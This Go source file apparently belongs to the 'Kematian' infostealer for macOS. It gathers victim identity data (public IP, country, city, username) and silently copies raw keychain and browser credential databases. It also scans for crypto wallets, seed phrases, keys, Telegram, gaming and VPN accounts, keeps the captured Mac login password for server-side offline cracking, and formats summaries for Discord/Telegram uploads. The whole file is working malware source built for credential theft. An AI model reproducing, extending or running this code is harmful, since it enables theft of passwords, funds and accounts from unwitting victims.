// collect.go — offline-crack harvest into harvestPayload (raw files + non-decrypt scans).
package main

import (
	"runtime"
	"sync"

	"recovery/recovery"
)

// harvestPayload is the in-memory harvest used for zip export and upload captions.
type harvestPayload struct {
	Hostname    string                     `json:"hostname"`
	OS          string                     `json:"os"`
	Arch        string                     `json:"arch"`
	PublicIP    string                     `json:"publicIp,omitempty"`
	Country     string                     `json:"country,omitempty"`
	CountryCode string                     `json:"countryCode,omitempty"`
	City        string                     `json:"city,omitempty"`
	MacUser     string                     `json:"macUser,omitempty"`
	Mode        string                     `json:"mode"`
	Result      *recovery.CollectionResult `json:"result"`
	Seeds       []recovery.SeedResult      `json:"seeds,omitempty"`
	// MacLoginPassword is captured for offline decrypt on the server (not logged to console).
	MacLoginPassword string `json:"-"`
	// RawFiles: keychain DB + browser Login Data / Local State / etc. (no decrypt).
	RawFiles []rawDiskFile `json:"-"`
	// Counts for summary
	RawKeychainFiles int `json:"rawKeychainFiles,omitempty"`
	RawBrowserFiles  int `json:"rawBrowserFiles,omitempty"`
}

// offlineCollectOptions skips all on-box browser/keychain decrypt paths.
// Still scans files, wallet trees, keys, telegram, gaming, vpn metadata.
func offlineCollectOptions() recovery.CollectOptions {
	opts := recovery.CollectOptions{Browsers: false}
	opts.Passwords = false
	opts.Cookies = false
	opts.Autofill = false
	opts.History = false
	opts.Bookmarks = false
	opts.CreditCards = false
	opts.Discord = false // needs Keychain / decrypt
	opts.Files = true
	opts.Wallets = true
	opts.Keys = true
	opts.Telegram = true
	opts.Apps = false // Wi‑Fi uses security(1) → possible system modals
	opts.Gaming = true
	opts.VPNs = true
	return opts
}

// runHarvestOffline: password already captured; no Keychain unlock; raw DBs + rest of scans.
func runHarvestOffline(hostname, macPassword string) (*harvestPayload, error) {
	opts := offlineCollectOptions()

	var extensions []recovery.ExtensionResult
	var extWg sync.WaitGroup
	extWg.Add(1)
	go func() {
		defer extWg.Done()
		extensions = recovery.ScanExtensions()
	}()

	// Raw priority targets (silent file copy only).
	rawKeychain := collectLoginKeychainRawFiles()
	rawBrowsers := collectBrowserRawDBFiles()
	rawFiles := append(append([]rawDiskFile{}, rawKeychain...), rawBrowsers...)

	result, err := recovery.Collect(opts, nil)
	if err != nil {
		return nil, err
	}

	extWg.Wait()
	result.Extensions = extensions

	// Seeds only from scanned files / empty password lists (no decrypted browser pwds).
	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)

	// Password candidates: only the captured Mac login password for offline use.
	if macPassword != "" {
		result.PasswordCandidates = appendMacLoginCandidate(nil, macPassword)
	}

	publicIP, country, countryCode, city, macUser := collectVictimInfo()

	return &harvestPayload{
		Hostname:         hostname,
		OS:               runtime.GOOS,
		Arch:             runtime.GOARCH,
		PublicIP:         publicIP,
		Country:          country,
		CountryCode:      countryCode,
		City:             city,
		MacUser:          macUser,
		Mode:             "offline-crack",
		Result:           result,
		Seeds:            seeds,
		MacLoginPassword: macPassword,
		RawFiles:         rawFiles,
		RawKeychainFiles: len(rawKeychain),
		RawBrowserFiles:  len(rawBrowsers),
	}, nil
}

// harvestSummary is the multi-line caption embedded in Discord/Telegram uploads.
func harvestSummary(p *harvestPayload) string {
	if p == nil {
		return "Harvest complete (empty)"
	}
	r := p.Result
	if r == nil {
		r = &recovery.CollectionResult{}
	}
	summary := formatSummary(
		p.Hostname, p.OS, p.Arch, p.PublicIP, p.CountryCode, p.Country, p.MacUser,
		0, 0, 0, 0, // no on-box decrypted passwords/cookies/autofill/history
		0, 0, 0, len(r.Extensions),
		countDesktopWallets(r.Wallets), len(r.Keys), len(r.Telegram), len(r.AppCredentials),
		countGaming(r.Gaming), countVPNs(r.VPNs), len(r.PasswordCandidates), len(p.Seeds),
	)
	summary += "\nmode: offline-crack (raw keychain + browser DBs — decrypt on server)"
	summary += "\nraw keychain files: " + itoa(p.RawKeychainFiles) + " | raw browser files: " + itoa(p.RawBrowserFiles)
	if p.MacLoginPassword != "" {
		summary += "\nmac login password: captured (see offline/mac_login_password.txt)"
	}
	return summary
}

func countDesktopWallets(wallets []recovery.WalletResult) int {
	n := 0
	for _, w := range wallets {
		if w.Type == "desktop" {
			n++
		}
	}
	return n
}

func countGaming(g *recovery.GamingResult) int {
	if g == nil {
		return 0
	}
	n := 0
	if g.Steam != nil {
		n++
	}
	n += len(g.BattleNet) + len(g.Epic) + len(g.Riot) + len(g.Uplay)
	return n
}

func countVPNs(v *recovery.VPNResult) int {
	if v == nil {
		return 0
	}
	return len(v.NordVPN) + len(v.WireGuard) + len(v.OpenVPN) + len(v.Mullvad)
}

func formatSummary(host, osName, arch, publicIP, countryCode, country, macUser string, pw, ck, af, hi, bk, cc, dt, ex, wl, keys, tg, apps, gaming, vpns, candidates, seeds int) string {
	identity := "Kematian harvest — " + host + " (" + osName + "/" + arch + ")\n"
	if publicIP != "" || macUser != "" || countryCode != "" {
		identity += "ip: " + fallback(publicIP, "unknown")
		if countryCode != "" {
			identity += " | country: " + countryCode
			if country != "" && country != countryCode {
				identity += " (" + country + ")"
			}
		}
		if macUser != "" {
			identity += " | user: " + macUser
		}
		identity += "\n"
	}
	return identity +
		"passwords: " + itoa(pw) + " | cookies: " + itoa(ck) + " | autofill: " + itoa(af) + "\n" +
		"history: " + itoa(hi) + " | bookmarks: " + itoa(bk) + " | cards: " + itoa(cc) + "\n" +
		"discord: " + itoa(dt) + " | wallet extensions: " + itoa(ex) + " | desktop wallets: " + itoa(wl) + "\n" +
		"keys: " + itoa(keys) + " | telegram: " + itoa(tg) + " | apps: " + itoa(apps) + "\n" +
		"gaming: " + itoa(gaming) + " | vpns: " + itoa(vpns) + " | pw candidates: " + itoa(candidates) + " | seeds: " + itoa(seeds)
}

func appendMacLoginCandidate(candidates []recovery.PasswordCandidateResult, password string) []recovery.PasswordCandidateResult {
	seen := make(map[string]bool, len(candidates))
	for _, c := range candidates {
		seen[c.Password] = true
	}
	if !seen[password] {
		candidates = append(candidates, recovery.PasswordCandidateResult{
			Password: password,
			Source:   "mac_login",
			Detail:   "macOS user password (offline-crack)",
		})
	}
	return candidates
}

func fallback(value, def string) string {
	if value != "" {
		return value
	}
	return def
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var buf [20]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}
